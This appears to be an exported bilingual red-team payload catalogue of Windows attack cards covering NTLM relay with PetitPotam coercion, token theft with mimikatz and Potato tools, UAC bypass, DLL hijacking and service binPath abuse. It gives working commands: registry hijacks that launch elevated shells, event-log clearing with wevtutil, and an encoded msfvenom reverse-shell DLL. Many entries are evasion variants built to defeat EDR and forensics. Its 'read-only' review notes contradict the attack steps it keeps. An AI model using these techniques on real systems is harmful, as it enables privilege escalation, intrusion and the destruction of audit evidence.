title.zh: ExecuteShellCommand 参数混淆规避变体

description.zh: 绕过对命令行参数的监控：环境变量路径+运行期拼接参数+非常规显示参数。成功判据：m.txt 生成。
description.en: Evades command-line argument monitoring via env-var paths, runtime-joined arguments, and an unusual show parameter. Success: m.txt appears.

title.zh: MMC20 大小写 ProgID 规避变体

description.zh: 绕过 ProgID 精确字符串匹配：大小写混合仍可解析激活。成功判据：m2.txt 生成。
description.en: Evades exact ProgID string matching since mixed case still resolves for activation. Success: m2.txt appears.

title.zh: ShellWindows 等价替代规避变体

description.zh: 绕过 MMC20 专项检测：等价的 Shell Browser Window CLSID 执行路径。成功判据：m3.txt 生成。
description.en: Evades MMC20-specific detection by using the equivalent Shell Browser Window CLSID execution path. Success: m3.txt appears.

name.zh: RDP 与 NTLM Relay 分类审计
name.en: RDP and NTLM Relay Classification Audit

description.zh: RDP 与 NTLM Relay 分类审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: RDP and NTLM Relay Classification Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 RDP 与 NTLM Relay 分类审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for RDP and NTLM Relay Classification Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: RDP 与 NTLM Relay 分类审计覆盖认证强制与端口暴露场景：厘清 RDP 3389 暴露与 NTLM 中继的边界，验证目标网络中的强制认证源与中继可行性。验证维度涵盖 SMB 中继执行、3389 端口可达性核对与 PetitPotam 强制认证触发三类步骤。
overview.en: RDP and NTLM Relay Classification Audit covers authentication coercion and port exposure: it separates RDP 3389 exposure from NTLM relaying and validates coercion sources and relay feasibility in the target network. Verification dimensions cover SMB relay execution, 3389 reachability checks, and PetitPotam coercion triggering.

vulnerability.zh: 根因是网络中存在未强制签名或通道绑定的服务（SMB、LDAP、ADCS HTTP）且可被强制认证触发：RDP 本身并非 NTLM Relay 的标准中继目标，实际风险来自打印机/EFSRPC 等强制认证原语把域控认证引导至中继器。
vulnerability.en: The root cause is services in the network without enforced signing or channel binding (SMB, LDAP, ADCS HTTP) that coercion can trigger: RDP itself is not a standard NTLM relay target, and the real risk comes from printer/EFSRPC coercion primitives steering DC authentication into a relay.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步运行 ntlmrelayx 配合 targets 文件中继 SMB，打印 RELAY 成功记录即确认中继链路可用；第 2 步用 Test-NetConnection 核对目标 3389 可达性，TcpTestSucceeded 为 True 仅作为暴露面记录；第 3 步用 petitpotam.py 触发目标向操作主机发起认证回调（printer bug 生效即确认强制认证源可用），回调可与第 1 步中继器组合为完整利用链。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 runs ntlmrelayx against a targets file for SMB — printed RELAY success records confirm the relay path; step 2 checks 3389 reachability with Test-NetConnection — TcpTestSucceeded True is exposure-surface evidence only; step 3 triggers target-to-operator authentication with petitpotam.py (a working printer bug confirms the coercion source), which pairs with the step 1 relay into a full chain. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 强制 SMB/LDAP 签名与通道绑定，ADCS 全部端点启用 EPA，禁用不需要的打印与 EFSRPC 远程调用并安装相关补丁；将 3389 暴露限制到管理网段。修复后用第 1、3 步样例回归，中继被签名拒绝且强制认证回调不再出现。
mitigation.en: Enforce SMB/LDAP signing and channel binding, require EPA on all ADCS endpoints, disable unnecessary printer and EFSRPC remote calls with relevant patches, and confine 3389 exposure to the management segment. After the fix, regress with the step 1 and step 3 samples: relays must fail on signing and coercion callbacks must disappear.

description.zh: 用 Test-NetConnection 探测目标 3389 端口；TcpTestSucceeded 为 True 即锁定可接收中继会话的 RDP 目标。
description.en: Probe port 3389 with Test-NetConnection; TcpTestSucceeded True marks RDP targets able to receive relayed sessions.

title.zh: 架设 NTLM 中继监听

description.zh: 启动 ntlmrelayx.py -tf targets.txt -smb2support；控制台出现认证捕获记录即认证流已入中继，等待触发即可。
description.en: Start ntlmrelayx.py -tf targets.txt -smb2support; capture lines on the console mean authentication is flowing through the relay, awaiting a trigger.

title.en: Coerce authentication to close the chain

description.zh: 用 petitpotam.py 诱导目标发起 EFSRPC 回连认证；中继端收到连接并完成会话即强制认证与中继全链闭环。
description.en: Use petitpotam.py to coerce the target into an EFSRPC callback; a completed session on the relay closes the coerce-and-relay loop.

analysis.zh: RDP 与 NTLM Relay 分类审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: RDP and NTLM Relay Classification Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 纠正原条目把 SMB/LDAP NTLM Relay 误称为 RDP Relay 的问题，并只核对协议签名与日志。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: HTTP 端口伪装规避变体

description.zh: 绕过 445/3389 端口中继的定向监控：中继监听落在 80，流量呈现为普通 Web。成功判据：HTTP 目标认证成功入 SOCKS。
description.en: Evades directed monitoring of 445/3389 relaying by listening on port 80 so traffic looks like ordinary web. Success: HTTP target authenticates into SOCKS.

title.zh: PrinterBug 强制轮换规避变体

description.zh: 绕过 PetitPotam 特征（特定 CLSID/RPC UUID 监控）：换打印机通知回调触发认证。成功判据：目标向操作机发起认证。
description.en: Evades PetitPotam signatures (specific CLSID/RPC UUID monitoring) by triggering auth via the printer notification callback instead. Success: the target authenticates toward the operator host.

title.zh: Restricted Admin 探测规避变体

description.zh: 绕过凭证驻留风险与 NLA 凭据提交：以受限管理模式探测 RDP，本地不提交明文凭据。成功判据：连接行为与普通 RDP 可区分且无凭据提交。
description.en: Evades credential-resident risk and NLA credential submission by probing RDP in restricted admin mode with no plaintext credential sent. Success: the connection is distinguishable from normal RDP with no credential submission.

name.zh: Windows 令牌权限与模拟防护
name.en: Windows Token Privilege and Impersonation Protection

description.zh: Windows 令牌权限与模拟防护保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: Windows Token Privilege and Impersonation Protection preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 Windows 令牌权限与模拟防护 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Windows Token Privilege and Impersonation Protection are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 Windows 令牌权限与模拟提权场景，检验高权限令牌的可枚举与可模拟面。验证维度含令牌列举、令牌窃取与 JuicyPotato、PrintSpoofer、GodPotato 三条模拟提权路径，对应第 1 至第 5 步。
overview.en: This payload covers Windows token-privilege and impersonation escalation, testing how enumerable and stealable high-privilege tokens are. Validation covers token listing, token theft, and the JuicyPotato, PrintSpoofer and GodPotato impersonation paths, mapped to steps 1 through 5.

vulnerability.zh: 根因在于服务进程常以高权限运行且默认授予 SeImpersonate 类特权：具备该特权的低权账户可诱骗高权限身份完成命名管道或 COM 认证，进而模拟其令牌获得 SYSTEM。
vulnerability.en: The root cause is service processes running with high privileges and defaulting to impersonation-class privileges: a low-privileged account holding SeImpersonate can lure a high-privilege identity into named-pipe or COM authentication and impersonate its token for SYSTEM.

exploitation.zh: 第 1 步用 mimikatz 的 token::list 枚举令牌锁定可模拟目标；第 2 步以 token::elevate 验证指定域用户令牌窃取；第 3 至第 5 步依次运行 JuicyPotato、PrintSpoofer 与 GodPotato，绑定命令以 SYSTEM 执行即确认对应路径。每步以 whoami 回显为判据。占位符在全局变量菜单替换；仅授权实验主机。
exploitation.en: In step 1, enumerate tokens with mimikatz token::list locking onto stealable targets. In step 2, verify theft of a specified domain user's token with token::elevate. In steps 3 through 5, run JuicyPotato, PrintSpoofer and GodPotato in turn; bound commands executing as SYSTEM confirm each path, judged by whoami output. Replace placeholders via the global variables menu; authorized lab hosts only.

mitigation.zh: 移除非必要服务的 SeImpersonate 与 SeAssignPrimaryToken 特权，服务账户改用托管身份，终端监控 potato 家族的进程与管道行为。修复后重放第 3 至第 5 步，提权工具应全部失败并触发告警。
mitigation.en: Strip SeImpersonate and SeAssignPrimaryToken from unneeded services, use managed identities for service accounts, and monitor potato-family process and pipe behavior on endpoints. After the fix, replay steps 3 through 5: every escalation tool should fail with alerts.

title.zh: 枚举可窃取的高权限令牌

description.zh: 用 mimikatz 的 token::list 列出系统全部令牌；输出中存在 SYSTEM 或 Administrator 所属令牌即锁定窃取目标，重点看可模拟的高完整性会话。
description.en: List all tokens with mimikatz token::list; SYSTEM or Administrator-owned tokens in the output become the impersonation targets.

description.zh: 用 token::elevate 指定 Administrator 域用户窃取其令牌；当前 shell 上下文切换为目标身份即完成模拟，直接继承该账户全部权限执行操作。
description.en: Invoke token::elevate for the Administrator account; the shell switching to that identity inherits every permission of the impersonated user.

description.zh: 以 SeImpersonate 特权运行 JuicyPotato 触发 COM 本地提权；绑定的 cmd 以 SYSTEM 执行即从服务账号跃升到最高权限，拿到管理员外壳。
description.en: Run JuicyPotato leveraging SeImpersonate to abuse COM elevation; the bound command executing as SYSTEM lifts a service account to the top of the box.

description.zh: 运行 PrintSpoofer 伪装打印服务命名管道，诱骗以 SYSTEM 运行的打印组件回连模拟；得到的 shell 显示 SYSTEM 即确认备选提权路径可用。
description.en: Run PrintSpoofer to fake a print-service named pipe and bait the SYSTEM spooler into impersonation; a SYSTEM shell proves the alternate route works.

title.en: Fall back to GodPotato on patched hosts

description.zh: 运行 GodPotato 借助 RPCSS 伪装链执行 whoami；返回 SYSTEM 即在补丁较新的环境仍可提权，与前两条路径互为备份手段。
description.en: Run GodPotato riding the RPCSS masquerade chain to execute whoami; a SYSTEM result keeps escalation viable on newer patches, backing up the other two routes.

analysis.zh: Windows 令牌权限与模拟防护只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Windows Token Privilege and Impersonation Protection is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 只读取当前令牌、SeImpersonate 等权限和相关事件，不复制、提升或模拟高权限令牌。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: 规避变体：已有会话窃取令牌
title.en: Evasion: token theft via existing session

description.zh: 规避点：不落地 mimikatz 二进制（绕杀软签名与磁盘审计），用既有 meterpreter 会话窃取目标进程令牌。判据：getuid 显示被窃取用户。
description.en: Avoids dropping mimikatz (signature and disk audit evasion) by stealing a token from an existing process. Success: getuid shows the target user.

title.zh: 规避变体：PowerShell 令牌模拟

description.zh: 规避点：内存加载 PowerShell 版模拟替代 mimikatz exe。判据：当前线程身份变为 Administrator。
description.en: In-memory PowerShell replacement for the mimikatz binary. Success: thread identity becomes Administrator.

title.zh: 规避变体：换 SweetPotato 规避哈希

description.zh: 规避点：更换工具家族规避已知 Potato 哈希与进程特征，输出重定向文件免弹窗。判据：p.txt 内容为 nt authority\system。
description.en: Different tool family evades known Potato hashes; file output avoids console popups. Success: p.txt shows nt authority\system.

title.zh: 规避变体：执行后痕迹清理

wafBypass.command: wevtutil cl Security && wevtutil cl System && del C:\\Windows\\temp\\p.txt

description.zh: 规避点：清除安全/系统事件日志与临时产物降低取证痕迹（仅在授权演练中使用）。判据：日志查看器中相关记录消失。
description.en: Clears security/system logs and temp artifacts to reduce forensic traces (authorized exercises only). Success: related events gone.

name.zh: UAC 策略与自动提升边界审计
name.en: UAC Policy and Auto-Elevation Boundary Audit

description.zh: UAC 策略与自动提升边界审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: UAC Policy and Auto-Elevation Boundary Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 UAC 策略与自动提升边界审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for UAC Policy and Auto-Elevation Boundary Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 UAC 策略与自动提升边界审计场景，检验管理员批准模式下自动提升接口的可劫持面。验证维度含 fodhelper、eventvwr 两类注册表劫持与 UACME 方法库调用，对应第 1 至第 3 步。
overview.en: This payload covers UAC policy and auto-elevate boundary auditing, testing the hijackable surface of auto-elevating interfaces under admin-approval mode. Validation covers fodhelper and eventvwr registry hijacks plus UACME method invocation, mapped to steps 1 through 3.

vulnerability.zh: 根因在于部分自动提升二进制按注册表类键定位处理程序且不校验完整性级别：普通用户改写 HKCU 对应键后调用系统工具，即可让命令以高完整性执行。
vulnerability.en: The root cause is some auto-elevating binaries resolving handlers via registry class keys without integrity checks: a standard user rewrites the HKCU key and invokes the system tool, executing a command at high integrity.

exploitation.zh: 第 1 步写入 ms-settings 的 Shell Open command 键并运行 fodhelper，绑定命令以高完整性执行即确认自动提升绕过；第 2 步对 mscfile 键做同样写入并运行 eventvwr 复测第二条路径；第 3 步用 UACME 的 Akagi64 调用编号方法验证库内其他绕过面。以进程完整性级别为成功判据。占位符在全局变量菜单替换；测试后清理全部劫持键。
exploitation.en: In step 1, write the ms-settings Shell Open command key and run fodhelper; the bound command executing at high integrity confirms the auto-elevate bypass. In step 2, repeat with the mscfile key and eventvwr to retest the second path. In step 3, invoke numbered methods with UACME's Akagi64 to verify other library bypasses. Judge success by process integrity level. Replace placeholders via the global variables menu; clean up all hijack keys after testing.

mitigation.zh: 把 UAC 级别调至最高并对自动提升程序启用安装程序检测，监控 HKCU 类键的写入与 fodhelper、eventvwr 的异常调用链。修复后重放第 1 至第 3 步，全部方法应失败并触发告警。
mitigation.en: Raise UAC to maximum with installer detection for auto-elevating programs, monitoring HKCU class-key writes and anomalous fodhelper and eventvwr call chains. After the fix, replay steps 1 through 3: every method should fail with alerts.

title.zh: 劫持 ms-settings 注册表键

description.zh: 写入 HKCU 下 ms-settings 的打开命令键并置空 DelegateExecute，再启动 fodhelper.exe；绑定命令以高完整性执行即无弹窗绕过 UAC。
description.en: Write the ms-settings open-command key with an empty DelegateExecute then launch fodhelper.exe; the bound command running high-integrity silently defeats the UAC prompt.

title.zh: 劫持 mscfile 自动提升

description.zh: 写入 mscfile 的打开命令键后运行 eventvwr.exe；事件查看器以管理员启动时加载劫持命令，同样免弹窗获得高完整性 shell。
description.en: Write the mscfile open-command key and run eventvwr.exe; the auto-elevated event viewer loads the hijacked command, yielding a high-integrity shell without prompts.

title.zh: 用 UACME 方法库批量验证

description.zh: 运行 Akagi64 以编号 23 执行指定绕过方法；目标进程持有管理员令牌即确认当前补丁环境下仍有可用绕过组合，可换编号扩大测试面。
description.en: Run Akagi64 with method 23; an admin token on the spawned process proves a working bypass on the current patch level, and other indices widen the sweep.

analysis.zh: UAC 策略与自动提升边界审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: UAC Policy and Auto-Elevation Boundary Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 核对 UAC 策略、自动提升二进制和相关注册表 ACL，不写入 shell/open/command 键或启动载荷。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

wafBypass.command:
reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d "cmd.exe" /f
reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /d "" /f
computerdefaults.exe

description.zh: 规避点：换自动提权入口 computerdefaults.exe，避免 fodhelper 进程监控；保留 DelegateExecute 空值是提权生效关键。判据：弹出管理员 CMD。
description.en: Different auto-elevate binary avoids fodhelper monitoring; the empty DelegateExecute is required. Success: elevated CMD opens.

title.zh: 规避变体：劫持键即时回滚

wafBypass.command:
reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /ve /d "cmd /c whoami > C:\\Windows\\temp\\u.txt" /f
eventvwr.exe
reg delete HKCU\\Software\\Classes\\mscfile /f

description.zh: 规避点：提权后立刻删除劫持键，缩短注册表监控窗口。判据：u.txt 生成且 mscfile 键已不存在。
description.en: Deletes the hijack key right after elevation to shrink the monitoring window. Success: u.txt created and key removed.

title.zh: 规避变体：uacMe 方法号轮换

description.zh: 规避点：切换 uacMe 方法号（23→61）绕过针对单一方法的 EDR 规则。判据：以高完整性启动 cmd。
description.en: Rotating the uacMe method index evades single-method EDR rules. Success: cmd starts high-integrity.

title.zh: 规避变体：无文件式环境变量劫持

description.zh: 规避点：SilentCleanup 以系统权限读取 HKCU\Environment 的 windir，全程无 dropper 文件。判据：任务执行后出现 SYSTEM 输出。
description.en: SilentCleanup reads the hijacked windir at SYSTEM with no dropped files. Success: SYSTEM output appears.

name.zh: DLL 搜索顺序与目录权限审计

description.zh: DLL 搜索顺序与目录权限审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: DLL Search-Order and Directory-Permission Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 DLL 搜索顺序与目录权限审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for DLL Search-Order and Directory-Permission Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 DLL 搜索顺序与目录权限提权审计场景，检验高权限应用目录的可写性与缺失 DLL 的劫持可达性。验证维度含目录 ACL 审计、测试载荷生成与落地放置三步，对应第 1 至第 3 步。
overview.en: This payload covers DLL search-order and directory-permission escalation auditing, testing writability of privileged application directories and reachability of missing-DLL hijacks. Validation covers directory ACL audits, payload generation and drop placement, mapped to steps 1 through 3.

vulnerability.zh: 根因在于应用安装目录继承的 ACL 允许普通用户写入，而加载器按搜索顺序解析缺失 DLL：攻击者放入同名库即被高权限进程执行。
vulnerability.en: The root cause is application install directories inheriting ACLs that let standard users write while loaders resolve missing DLLs by search order: a same-named library dropped by an attacker executes inside the privileged process.

exploitation.zh: 第 1 步读取目标应用目录的 ACL，识别普通用户可写路径即锁定劫持点；第 2 步用 msfvenom 生成 64 位反向 DLL 作为验证载荷；第 3 步把 DLL 复制为目标缺失 DLL 名，copy 无报错即确认可写，等待或触发高权限进程加载并回连监听。以 SYSTEM 会话建立为成功判据。占位符在全局变量菜单替换；测试后删除载荷。
exploitation.en: In step 1, read the target application directory's ACL and identify standard-user-writable paths to lock onto the hijack point. In step 2, generate a 64-bit reverse DLL with msfvenom as the verification payload. In step 3, copy the DLL under the missing DLL's name; an errorless copy confirms writability, then wait for or trigger the privileged process to load it and call back. Judge success by establishing a SYSTEM session. Replace placeholders via the global variables menu; remove the payload after testing.

mitigation.zh: 修正应用目录 ACL 仅允许管理员写入，启用 DLL 签名或 SetDefaultDllDirectories 限制搜索路径，监控新增 DLL 加载。修复后重放第 3 步，复制应被拒绝且无异常加载事件。
mitigation.en: Fix directory ACLs to administrator-only writes, enable DLL signing or SetDefaultDllDirectories to constrain search paths, and monitor new DLL loads. After the fix, replay step 3: the copy should be denied with no anomalous load events.

description.zh: 读取目标应用安装目录的访问控制列表；普通用户对目录具备写入权限即满足 DLL 落地劫持的前提，记录可写的具体路径供第 3 步使用。
description.en: Read the target application directory ACL; ordinary-user write access satisfies the prerequisite for planting a DLL, so note the writable path for step 3.

title.zh: 生成恶意 DLL 载荷

description.zh: 用 msfvenom 生成 64 位反向连接 DLL 保存为 evil.dll；本地监听 4444 端口就绪后等待目标进程加载触发回连。
description.en: Generate a 64-bit reverse-tcp DLL with msfvenom as evil.dll; with the 4444 listener armed, loading the DLL triggers the callback.

title.zh: 落地 DLL 触发提权
title.en: Plant the DLL to trigger escalation

description.zh: 把第 2 步生成的 DLL 复制为目标程序缺失的 missing.dll；程序重启加载该文件并回连监听，即以服务权限获得 shell 完成提权。
description.en: Copy the step-2 DLL over the missing.dll the app searches for; on next launch the hijacked load calls back and lands a service-privileged shell.

analysis.zh: DLL 搜索顺序与目录权限审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: DLL Search-Order and Directory-Permission Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 使用签名无害 DLL 夹具核对搜索顺序、缺失模块和可写目录，不生成反向连接 DLL。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: 规避变体：免杀编码 DLL

wafBypass.command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LAB_OPERATOR_HOST} LPORT=4444 -f dll -e x64/xor_dynamic -i 3 > evil.dll

description.zh: 规避点：加编码器与迭代次数破坏静态特征。判据：DLL 落盘不触发告警且会话建立。
description.en: Encoder plus iterations breaks static signatures. Success: no alert on write and a session returns.

title.zh: 规避变体：签名程序 sideload

description.zh: 规避点：劫持常驻签名程序 OneDrive 的 version.dll，借其白名单进程启动。判据：OneDrive.exe 子进程回连。
description.en: Hijacks a resident signed binary so payload rides its whitelisted process. Success: OneDrive.exe child calls back.

title.zh: 规避变体：ACL 修改最小化

description.zh: 规避点：只授予写权限而非完全控制，减少 ACL 审计差异。判据：普通用户可写但审计项更少。
description.en: Grants write-only instead of full control to shrink the audit delta. Success: user can write with fewer audit flags.

title.zh: 规避变体：事后痕迹还原

description.zh: 规避点：删除劫持 DLL 并回滚 ACL 变更。判据：目录回到初始权限且无残留文件。
description.en: Removes the DLL and reverts ACL changes. Success: directory back to baseline with no leftovers.

name.zh: Windows 服务 ACL 与路径审计
name.en: Windows Service ACL and Path Audit

description.zh: Windows 服务 ACL 与路径审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: Windows Service ACL and Path Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 Windows 服务 ACL 与路径审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Windows Service ACL and Path Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 Windows 服务 ACL 与路径提权审计场景，检验普通用户对服务配置的改写能力与执行上下文。验证维度含服务权限枚举、binPath 改写与重启触发三步，对应第 1 至第 3 步。
overview.en: This payload covers Windows service ACL and path escalation auditing, testing standard users' ability to rewrite service configuration and the execution context that follows. Validation covers service-permission enumeration, binPath rewriting and restart triggering, mapped to steps 1 through 3.

vulnerability.zh: 根因在于部分服务的 ACL 授予普通用户写权限或路径含空格未加引号：改写 binPath 或植入同名可执行文件后，服务以 LocalSystem 启动攻击者命令。
vulnerability.en: The root cause is some services granting write ACLs to standard users or holding unquoted spaced paths: after rewriting binPath or planting a same-named executable, the service launches attacker commands as LocalSystem.

exploitation.zh: 第 1 步用 accesschk 枚举普通用户可写服务，输出带全权限的服务清单即锁定目标；第 2 步以 sc config 改写目标服务 binPath 并用 qc 回读确认修改成功；第 3 步 stop 并 start 重启服务，命令以 SYSTEM 上下文执行即确认提权成立。以执行身份回显为成功判据。占位符在全局变量菜单替换；测试后恢复原 binPath。
exploitation.en: In step 1, enumerate standard-user-writable services with accesschk; the all-permissions service list locks onto targets. In step 2, rewrite the target binPath with sc config and confirm via qc read-back. In step 3, stop and start the service; the command executing as SYSTEM confirms escalation. Judge success by execution-identity output. Replace placeholders via the global variables menu; restore the original binPath after testing.

mitigation.zh: 以 accesschk 定期巡检服务 ACL 并回收写权限，修正引号与路径归属，监控 sc config 调用。修复后重放第 2 步，改写应被拒绝并记录访问事件。
mitigation.en: Periodically audit service ACLs with accesschk and revoke write grants, fix quoting and path ownership, and monitor sc config calls. After the fix, replay step 2: rewrites should be denied with access events logged.

description.zh: 用 accesschk 枚举 Users 组可修改配置的服务；输出含 SERVICE_ALL_ACCESS 的条目即锁定服务提权目标，优先选择可重启的服务。
description.en: Enumerate services the Users group can reconfigure with accesschk; entries with SERVICE_ALL_ACCESS become escalation targets, restartable ones first.

title.zh: 改写服务 binPath 注入命令
title.en: Rewrite binPath to inject a command

description.zh: 用 sc config 把目标服务的 binPath 改为待执行命令；qc 回读显示新路径即注入完成，等待下一次服务启动触发执行。
description.en: Point the target service's binPath at your command with sc config; a qc readback showing the new path means the payload is armed for the next start.

title.zh: 重启服务以 SYSTEM 执行
title.en: Restart the service to execute as SYSTEM

